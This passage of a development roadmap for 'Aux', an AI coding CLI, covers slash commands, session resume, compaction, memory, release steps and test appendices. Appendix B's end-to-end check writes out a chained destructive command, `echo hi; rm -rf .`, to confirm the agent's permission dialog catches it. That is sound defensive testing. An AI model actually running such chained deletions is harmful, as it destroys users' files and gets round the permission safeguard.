`internal/tui/tui.go` (command registry at :989), `internal/tui/page/chat.go`,
`internal/tui/components/dialog/commands.go`, `internal/completions`.

**Steps.**
1. In `send()`, if `isSlashCommand(value)` or the value starts with `/` and a
   registered command ID matches the first token: emit a `RunCommandMsg{ID,
   Args}` instead of `SendMsg`.
2. `tui.go` handles `RunCommandMsg` by looking up the registry and invoking
   `Handler`; for commands with arguments (`exclude`, `remember`) pass the
   remainder as the argument instead of opening the arguments dialog when it is
   present.
3. Add `/help` (toggles the help overlay), `/model` (opens the model dialog),
   `/sessions` (opens the session dialog), `/compact`, `/init`.
4. Completion: when the composer begins with `/`, show the command list
   filtered by prefix, Tab/Enter to accept. Reuse `dialog.CompletionSelectedMsg`.
5. Unknown `/foo` → status-bar warning *"unknown command /foo; Ctrl+K lists
   commands"*, and the text is **not** sent to the model.

**Done when.**
- Tests in `components/chat` assert `/init` produces `RunCommandMsg` and never
  `SendMsg`; `/unknown` produces a warning; `/exclude main.go` carries the arg.
- Golden test for the completion popup.

**Guardrails.** A message that merely *contains* a slash (`see /etc/hosts`) is
not a command; only a leading `/` with a registered ID.

---

### M2.4 `--continue` and `--resume` — **S**

**Goal.** Resume work from the shell the way Claude Code users expect.

**Files.** `cmd/root.go`, `internal/tui/tui.go` (initial session selection),
`internal/session/session.go` (`List` exists; add `MostRecent(ctx)`).

**Steps.**
1. `--continue` / `-C`: open the TUI on the most recently updated top-level
   session (exclude task sessions created by subagents).
2. `--resume [id]` / `-r`: with an id, open that session; without, open the
   session dialog on start.
3. Both work with `-p`: `aux -p "and now add tests" --continue` appends to the
   most recent session.
4. Document in README's flags table.

**Done when.** `cmd` gains its first test file (`root_test.go`) asserting flag
parsing and session selection against a seeded test DB.

---

### M2.5 Compaction as a decision — **M**

**Goal.** The user is warned before auto-compaction, sees what is largest in
the window, and can exclude, pin, or compact deliberately.

**Why.** Auto-compaction fires silently at 95% of the context window. The page
list and the (now correct) occupancy meter exist.

**Files.** `internal/tui/page/chat.go` (where auto-compact triggers),
`internal/tui/components/chat/context_pane.go`, a new dialog
`components/dialog/compact.go`.

**Steps.**
1. At 80% occupancy, show a one-line status-bar warning with the largest page
   (by `TokenCount`) named.
2. At 90%, open a dialog: top five pages by token count, keys to exclude (`x`)
   or pin (`p`), a `Compact now` action, and `Continue anyway`.
3. Auto-compaction still fires at 95% as the safety net, but only after the
   dialog has been shown at least once in that session.

**Done when.** Golden tests for the dialog; a unit test drives occupancy
through 80/90/95 and asserts the sequence.

---

### M2.6 `/remember` and memory UX — **M**

**Goal.** Users can tell Aux something once and see, edit, and delete what it
remembers.

**Steps.**
1. `/remember <text>` creates a factual memory, project scope, state active,
   confidence 1.0, source `user`. `--user` flag or `/remember --user` for
   `~/.aux/` scope is **deferred**; project scope only for 0.1.0 (the user/org
   scope question is still open in `TODO.md`).
2. `aux memory list [--json]`, `aux memory forget <id>`, `aux memory
   forget --task <task-id>`, `aux memory wipe --yes`.
3. When the memory section is rendered into the prompt (M1.3), emit a
   `memory.used{ids}` event so the dashboard can show provenance.
4. Dashboard `/memory` view: add Forget buttons? **No** — the dashboard is
   read-only by design. Show the IDs so the CLI can act on them.

**Done when.** `memory_test.go` covers create/list/forget; a scratch session
shows a `/remember`ed fact appearing in the next turn's system addendum
(inspect `ContextCompiled` or add a debug log).

---

### M2.7 Text that says the wrong thing — **S**

- `internal/llm/prompt/coder.go:28`: the OpenAI variant opens "built by
  OpenAI". Replace with the same identity sentence as the Anthropic variant.
- `cmd/root.go` `Long` description: write Aux's own; drop the OpenCode text.
- Instruction file name: standardise on `AUX.md`; keep `Aux.md`, `aux.md`,
  `CLAUDE.md` as read aliases in `defaultContextPaths` (`config.go:172-182`);
  the `/init` prompt writes `AUX.md`.
- Dashboard URL in the intro message: print only `http://127.0.0.1:<port>` in
  the chat and tell the user to press `d` in the context pane for the tokened
  link (which already renders correctly). This also stops the token being
  written into the transcript (D10).
- `--version` splash: unchanged (M3.5 handles the value).

**Done when.** `rg -n "built by OpenAI|powerful terminal-based AI assistant"`
is empty; a test asserts the intro message contains no `token=`.

---

### M2.8 Provider trimming — **S**

Per D4, add an `Unmaintained` flag to `models.Model`/provider metadata. The
model picker shows the group last with a label; the README lists them under
"Unmaintained providers (may work, not tested)". No code removal in 0.1.0.

---

## M3 — Release

### M3.1 First real release through the workflow — **M [HUMAN for the tag]**

**State.** `goreleaser check` passes; a snapshot built four archives and four
packages; the workflow uses `secrets.GITHUB_TOKEN`. No tag has ever been
pushed.

**Steps.**
1. Push `v0.1.0-rc.1` **[HUMAN]**. Watch the `release` workflow to completion.
2. Download `aux-mac-arm64.tar.gz` and `aux-linux-x86_64.tar.gz` from the
   GitHub release; run `./aux --version` from each on the right OS — expect
   `0.1.0-rc.1`, not a pseudo-version.
3. Fix anything that broke; repeat with `rc.2` as needed.
4. After M3.2–M3.6 are merged, push `v0.1.0`.

**Done when.** The release page has eight artifacts and `checksums.txt`, and
the downloaded binaries report the tag.

---

### M3.2 `install` script works on a clean machine — **S**

**Steps.**
1. Fix the URL base to the renamed repo (M0.5).
2. Run on a clean macOS user account and in a fresh `ubuntu:latest` container:
   `curl -fsSL https://raw.githubusercontent.com/kaiau00/aux-cli/main/install | bash`
   then `aux --version`.
3. Test `VERSION=0.1.0-rc.1` pinning.

**Done when.** Both platforms install and report the version; the README
install section is updated with the exact command.

---

### M3.3 `go install` works — **S**

After M0.5 and a tag: `go install github.com/kaiau00/aux-cli@v0.1.0-rc.1` on
a machine without the repo cloned. `--version` should report the tag via the
build-info fallback (`version.go:40-46`).

---

### M3.4 Homebrew tap — **S [HUMAN to create the tap repo]**

1. **[HUMAN]** Create `github.com/kaiau00/homebrew-tap`.
2. Add a `brews:` block to `.goreleaser.yml` targeting it; it needs a token
   with write access to the tap repo — add `HOMEBREW_TAP_TOKEN` as a repository
   secret **[HUMAN]** and reference it in `release.yml`. (The old
   `HOMEBREW_GITHUB_TOKEN` was removed because it was never set; this is the
   deliberate return of that mechanism with the secret actually present.)
3. `brew install kaiau00/tap/aux` on a clean machine.

---

### M3.5 `--version` for local builds — **S**

`version.go:40-46` returns `stamped` (= `unknown`) when `info.Main.Version` is
`""` or `(devel)`. A plain `go build` in this repo yields `(devel)`, so local
builds print `unknown`. Use `debug.BuildInfo.Settings` (`vcs.revision`,
`vcs.time`, `vcs.modified`) to synthesise `devel-<short-sha>[-dirty]` when the
linker stamped nothing. Keep the stamped-wins rule. Add a test case.

---

### M3.6 README rewrite — **M**

Written after M1 and M2 are merged, in one PR, reviewed against the running
binary:

- First screen: what Aux is (§1.1 here, shortened), **"Aux is derived from
  [OpenCode](https://github.com/opencode-ai/opencode) by Kujtim Hoxha"**
  (D14), install (the three working channels from M3.2–M3.4), one-minute
  quick start.
- No performance claim (D13). The benchmark harness is documented as a tool,
  not a result.
- "How it works" from M1.7.
- Provider table: five maintained, six unmaintained, with the default-model
  rule stated.
- Flags table including `--yes`, `--continue`, `--resume`.
- Slash command table.
- Keep: dashboard, TUI keys, configuration, MCP, LSP, custom commands,
  upgrading, development, license.
- `docs/trying-aux.md` updated to match (especially the `-p` paragraph, now
  about `--yes`).

**Done when.** Someone who did not write the code reads it against a scratch
session and finds no false sentence. Record their name and date in `TODO.md`.

---

### M3.7 Coverage: entry points and file history — **M**

33.8% against a stated 80%. For 0.1.0 the floor must rise meaningfully, not
reach 80. Priority by blast radius:

1. `cmd` — every subcommand gets a test against a seeded SQLite DB in a temp
   dir (`internal/db/dbtest` helpers exist). M2.4 starts this file.
2. `internal/history` — backs every checkpoint; zero tests.
3. `internal/format`, `internal/tui/components/logs`.

Raise `.coverage-floor` after each. Target for the tag: **≥ 45%**.

---

## M4 — Evidence (after the tag; informs 0.2)

### M4.1 Re-run both benchmark suites against the wired build

`bench/suite.example.json` (Python, five tasks) and `bench/suite-ts.json`
(TypeScript, five tasks) were measured against a build that never sent the
manifest. Re-run with `aux eval suite --repeat 10` a side, same model both
sides, and report **pass rate next to tokens every time**. The prior result
was p=0.06 with Aux less reliable (4/25 vs 0/25). If the wired build is not
both cheaper *and* at least as reliable, the README stays silent on
performance.

### M4.2 Decide `--paging`'s default

`DedupCompiler` saves 47.9% on the repeated-read fixture, 0% elsewhere. Flip
the default only if M4.1 shows no reliability regression with it on.

### M4.3 Tool-result eviction with promotion

Replace consumed tool results with one-line pointers after promoting facts to
memory. Highest-value, highest-risk idea in the backlog. Do not start before
M4.1 can detect silent context loss. Reintroduces the `evicted` state removed
in M1.6.

---

## 6. Release checklist for v0.1.0 (in order)

- [x] M0.1 bash safe-list — merged, test cited in `TODO.md` (#29)
- [x] M0.1b safe-list argument rules — merged (#32)
- [x] M0.2 `--yes` — merged (#30)
- [x] M0.3 PR #28 merged, floor raised to 33.8
- [x] M0.4 hygiene — merged (#31)
- [ ] M0.5 repo renamed **[HUMAN]**, URLs verified
- [ ] M1.1–M1.4 — merged in order, scratch-repo e2e in Appendix B passes
- [ ] M1.5 govpolicy removed, M1.6 states removed
- [ ] M1.7 README "How it works" true
- [ ] M2.1 catalog, M2.2 SDKs ×4, M2.3 slash, M2.4 resume, M2.5 compaction,
      M2.6 memory UX, M2.7 text, M2.8 trimming — merged
- [ ] M3.5 `--version` local builds
- [ ] M3.7 coverage ≥ 45%, floor raised
- [ ] M3.6 README rewrite, reviewed by a non-author against a scratch session
- [ ] `v0.1.0-rc.N` tagged **[HUMAN]**; artifacts downloaded and run on macOS
      and Linux
- [ ] M3.2 install script tested on both; M3.3 `go install` tested;
      M3.4 Homebrew tested
- [ ] `TODO.md` claims table reviewed line by line against the rc binary
- [ ] `v0.1.0` tagged **[HUMAN]**
- [ ] One outside user on a real repository for a week; findings recorded in
      `TODO.md`

---

## 7. Glossary

- **Project Brain** — effective profile (from `internal/profile` scanners) +
  active memories + related-project edges, rendered as text for the model.
- **Effective profile / manifest** — merged, precedence-ordered facts about
  the project; `profile.Effective.Manifest` is its text form.
- **Task spec** — compiled from the objective by `task.Compile`: mode, scope,
  acceptance criteria, validation intents, budget.
- **Page** — a unit of prompt content the context store tracks (a message, a
  tool result, the manifest, the task spec). **Resident** = in the prompt;
  **available** = known, not sent; **pinned** = always sent in full.
- **Stable prefix** — the part of the request providers cache: system prompt
  and tool definitions. Must be byte-identical across turns to get cache hits.
- **System addendum** (M1.1) — per-call text appended after the base system
  prompt; carries the Project Brain and task spec.
- **Validation intent** — a planned run of a profile command against an
  acceptance criterion. **Evidence** — the recorded result of actually running
  it. A criterion is **Validated** only by evidence, never by a model's claim.
- **Procedural memory** — a command that validated successfully; **episodic**
  — a past task's summary; **factual** — a stated fact (user or scanner).
- **Skill candidate** — a procedure proposed from validated work; **active**
  only after `evaluate --result pass` and `promote`.
- **Governor** — `cost.Governor`; `observe` records pressure events, `on`
  stops at the budget and asks.
- **Ledger** — per-model-call cost/token rows; session totals are derived from
  it, never written directly.

---

## Appendix A — Commands every PR runs

```bash
gofmt -l .                       # must print nothing
go vet ./...
AUX_UNICODE_ICONS=1 go test -race ./...
./scripts/deadcode.sh            # "Reachability unchanged" or entries removed
./scripts/coverage.sh            # at or above .coverage-floor
```

## Appendix B — Scratch-repo end-to-end check

Use this after M1.4 and before every rc. It is the only test that exercises
the thesis end to end. Never run it in a repository you care about.

```bash
rm -rf /tmp/aux-e2e && mkdir -p /tmp/aux-e2e && cd /tmp/aux-e2e
git init -q
printf 'module example.com/e2e\n\ngo 1.24\n' > go.mod
printf 'package main\n\nfunc Add(a, b int) int { return a + b }\n\nfunc main() {}\n' > main.go
printf 'package main\n\nimport "testing"\n\nfunc TestAdd(t *testing.T) { if Add(1,2) != 3 { t.Fatal() } }\n' > main_test.go
git add -A && git commit -qm init

export ANTHROPIC_API_KEY=...     # or another maintained provider
go build -o /tmp/aux-bin /path/to/aux-cli

# 1. First run picks a model and says so (M2.1)
/tmp/aux-bin -p "What does this project do?" --yes
#    expect: "Using <model> (newest for anthropic)…" then an answer

# 2. A mutating task ends with validation and learning (M1.4)
/tmp/aux-bin -p "Add a Sub(a, b int) int function with a test" --yes
TASK=$(/tmp/aux-bin task list --json | jq -r '.[0].id')   # add `task list` if missing
/tmp/aux-bin task show "$TASK"       # criteria show Validated via evidence
/tmp/aux-bin skill list              # one candidate: "go test ./..."
/tmp/aux-bin memory list             # one procedural, two episodic

# 3. The brain reaches the model (M1.1–M1.3)
sqlite3 .aux/aux.db "select payload from events where type='context.compiled' order by seq desc limit 1" \
  | jq '.residentPages, .tokenEstimate'
#    expect residentPages to include the manifest and task spec pages

# 4. Without --yes, nothing mutating runs (M0.2)
/tmp/aux-bin -p "delete main_test.go"
#    expect: denial list on stderr, file still present

# 5. Bypass attempts prompt (M0.1) — interactive
/tmp/aux-bin                        # ask it to run `echo hi; rm -rf .` → permission dialog appears
```

## Appendix C — What a good PR for this plan looks like

- Title: `M1.4: run validation at task end`
- Body: the item's *Goal*, what was measured for *Done when* (paste the test
  names and the scratch-repo output), anything found along the way (added to
  `TODO.md` *Opportunistic*, not fixed here).
- `TODO.md` updated: item moved to the appendix with one line of evidence.
- No unrelated formatting changes. No new `.deadcode-baseline` entries without
  a reason comment.
